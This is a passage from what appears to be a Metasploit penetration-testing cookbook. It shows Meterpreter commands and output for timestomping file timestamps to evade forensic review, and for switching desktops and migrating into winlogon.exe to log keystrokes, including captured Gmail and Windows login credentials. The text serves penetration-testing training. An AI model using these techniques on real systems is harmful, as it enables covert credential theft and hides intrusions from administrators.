
## Getting ready

Before starting with the recipe, you may have a key question. Why change the MACE values? Hackers generally use the technique of changing the MACE values to make the target user think that the file has been present on the system for a long time and that it has not been touched or modified. In case of suspicious activity, the administrators may check for recently modified files to find out whether any of the files have been modified or accessed. So, using this technique, the file will not appear in the list of recently accessed or modified items. Even though there are other techniques to find out if the file attributes have been modified, this technique can still be handy.

Let's pick up a file from the target machine and change its MACE attributes. The following screenshot shows the various MACE values of a file before using timestomp:

![](img/6b6e557533100c0e47951d0e5e14c4ee_504_0.png)

Now, we will move on and change the various MACE values. Let's start with the common timestomp -h command, which is used to list the various available options. We can use the -v operator to list the values of MACE attributes:

```
meterpreter > timestomp C:\flag.txt -v
[*] Showing MACE attributes for C:\flag.txt
Modified  : 2017-10-30 12:24:57 -0400
Accessed  : 2017-10-30 12:24:57 -0400
Created   : 2017-10-30 12:24:57 -0400
Entry Modified: 2017-10-30 12:24:57 -0400
```

## How to do it...

We will start by changing the creation time of the file. Notice the various parameters passed with the timestomp command:

```
meterpreter > timestomp C:\flag.txt -c "05/25/2017 01:01:01"
[*] Setting specific MACE attributes on C:\flag.txt
```

## How it works...

The -c operator is used to change the creation time of the file. Similarly, we can use the -m and -a operators to change the modified and last accessed attributes of the file:

```
meterpreter > timestomp C:\flag.txt -m "05/25/2017 01:01:01"
[*] Setting specific MACE attributes on C:\flag.txt
meterpreter > timestomp C:\flag.txt -a "05/25/2017 01:01:01"
[*] Setting specific MACE attributes on C:\flag.txt
```

Once the attributes have been changed, we can use the -v operator again to check and verify whether we have successfully executed the commands or not. Let's move ahead and check the file attributes again:

```
meterpreter > timestomp C:\flag.txt -v
[*] Showing MACE attributes for C:\flag.txt
Modified  : 2017-05-25 02:01:01 -0400
Accessed  : 2017-05-25 02:01:01 -0400
Created   : 2017-05-25 02:01:01 -0400
Entry Modified: 2017-10-30 12:24:57 -0400
```

We have successfully modified the MACE attributes of the file. Now, this file can be easily hidden from the list of recently modified or recently accessed files.

Alternatively, we can also use the -z operator to change all four MACE values in one go. We will not have to pass the commands separately for each of them. But, the -z operator will assign the same values to all four MACE attributes, which is practically not possible. There has to be some time difference between the creation and accessed time. So, the use of the -z operator should be avoided.

## There's more...

Metasploit created a group of tools called the **Metasploit Anti-Forensic Investigation Arsenal (MAFIA)** as part of its research projects, including:

- Timestomp
- Slacker
- Transmogrify
- SAM Juicer

Since these tools have not been updated for more than 5 years, they are no longer compatible with modern operating systems.

## The getdesktop and keystroke sniffing

In this recipe, we will deal with some of the `stdapi` user interface commands associated with desktops and keystroke sniffing. Capturing the keystrokes depends on the current active desktop, so it is essential to understand how we can sniff different keystrokes by switching between processes running in different desktop active sessions. Let's move ahead with the recipe to understand this better.

### Getting ready

- The `enumdesktops` command will list all the accessible desktops and window stations:

```
meterpreter > enumdesktops
Enumerating all accessible desktops
```

| Session | Station | Name |
|---|---|---|
| 0 | WinSta0 | Default |
| 0 | WinSta0 | Disconnect |
| 0 | WinSta0 | Winlogon |

Here, you can see that all the available desktop stations are associated with session 0. We will see in a while exactly what we mean by session 0.

- The getdesktop command returns the information of the current desktop in which our Meterpreter session is working:

```
meterpreter > getdesktop
Session 0\S\D
```

You can relate the output of the getdesktop command with enumdesktops to understand more about the current desktop station in which we are working.

- The setdesktop command is used to change the current Meterpreter desktop to another available desktop station
- The keyscan_start command is used to start the keystroke sniffer in the current active desktop station
- The keyscan_dump command dumps the recorded keystrokes of the active Meterpreter desktop session

Now, let's analyze how these commands work in a real-time scenario and how we can sniff keystrokes through different desktop stations.

### How to do it...

Before we proceed further with the recipe, there is an important concept about the Windows desktop that we will look at.

The Windows desktop is divided into different sessions in order to define the ways we can interact with the Windows machine. Session 0 represents the console. The other sessions, Session 1, Session 2, and so on, represent remote desktop sessions.

Every Windows session can be comprised of different stations, out of which WinSta0 is the only interactive station, meaning that it is the only station that the user can interact with. WinSta0 consists of three different desktops, namely, Default, Disconnect, and Winlogon. A desktop is a logical display surface containing user interface objects, such as windows, menus, and hooks. The Default desktop is associated with all the applications and tasks that we perform on our desktop; the Disconnect desktop is concerned with the screensaver lock desktop and the Winlogon desktop with the Windows login screen.

The point to note here is that each desktop has its own keyboard buffer. So, if you have to sniff the keystrokes from the Default desktop, you will have to make sure that your current Meterpreter active browser is set to Session 0/WinSta0/Default. If you have to sniff the login password, you will have to change the active desktop to Session 0/WinSta0/Winlogon.

- 1. Let's check our current desktop using the getdesktop command:

```
meterpreter > getdesktop
Session 0\S\D
```

As you can see, we are not in the WinSta0 station, which is the only interactive desktop station. So, if we run a keystroke capture here, it won't return any result.

- 2. Let's change our desktop to WinSta0\Default:

```
meterpreter > setdesktop
Changed to desktop WinSta0\Default
meterpreter > getdesktop
Session 0\WinSta0\Default
```

The preceding command line shows that we moved to the interactive Windows desktop station by using the setdesktop command.

- 3. So, now we are ready to run a keystroke sniffer to capture the keys pressed by the user on the target machine:

```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
meterpreter > keyscan_dump
Dumping captured keystrokes...
gmail.com<CR>
demouser<Right Shift>@gmail.com<CR>
<Right Shift>P4ssw0rd<CR>
```

Looking at the dumped keystrokes, you can clearly identify that the target user went to gmail.com and entered his/her credentials to log in.

What if you want to sniff the Windows login password? Obviously, you can switch your active desktop to WinSta0\Winlogon using the setdesktop command, but here we will discuss an alternate approach as well.

- 4. We can migrate to a process which runs during the Windows login. Let's execute the ps command to check the running processes:

```
meterpreter > ps
...
4336 5664 winlogon.exe x64 1 NT AUTHORITY\SYSTEM
C:\Windows\system32\winlogon.exe
...
```

You will find winlogon.exe running as a process with a process ID. In this case, the process ID (PID) of winlogon.exe is 4336.

- 5. Now, let's migrate to this PID and check our active desktop again:

```
meterpreter > migrate 4336
[*] Migrating from 352 to 4336...
[*] Migration completed successfully.
meterpreter > getdesktop
Session 0\WinSta0\Winlogon
```

- 6. You can see that our active desktop has changed to WinSta0\Winlogon. Now, we can run the keyscan_start command to start sniffing the keystrokes on the Windows login screen:

```
meterpreter > keyscan_start
Starting the keystroke sniffer ...
```
